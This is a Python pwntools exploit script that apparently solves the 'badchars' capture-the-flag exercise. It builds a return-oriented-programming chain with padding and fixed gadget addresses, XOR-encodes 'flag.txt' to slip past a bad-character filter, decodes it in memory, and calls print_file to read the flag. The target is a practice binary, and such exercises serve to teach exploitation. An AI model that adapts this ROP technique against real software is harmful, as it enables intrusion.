from pwn import *
io = process("./badchars")

padding = b"A" * 40
movR13R12 = p64(0x400634)
popR12R13R14R15 = p64(0x40069c)
xorR15R14 = p64(0x400628)
popRdi = p64(0x4006a3)
popR15 = p64(0x4006a2)
printFilePlt = p64(0x400510)

def checkBadChars(string):
    for i in string:
        if i == ord("x") or i == ord("g") or i == ord("a") or i == ord("."):
            return False

    return True

def craftExploit(initialString,pos):
    stringLocation = pos
    strLen = len(initialString)
    if strLen != 8:
        print("Length need to be 8 bytes")
        return False

    string = b""
    for i in range(strLen):
        string += str.encode(chr(initialString[i] ^ 15))

    #mov string into memory and xor first char
    exploit = padding + popR12R13R14R15 + string + p64(stringLocation) + p64(15) + p64(stringLocation) + movR13R12 + xorR15R14
    for i in range(7):
        exploit += popR15 + p64(stringLocation + i + 1) + xorR15R14

    exploit += popRdi + p64(stringLocation) + printFilePlt
    return exploit

#Xor reverse Xor
#n ^ 15 = a; h ^ 15 = g; ! ^ 15 = .; w ^ 15 = x
exploit = craftExploit(b"flag.txt",0x6010b0)
io.send(exploit)
io.recvuntil(b"Thank you!\n")
print(io.recv().decode())
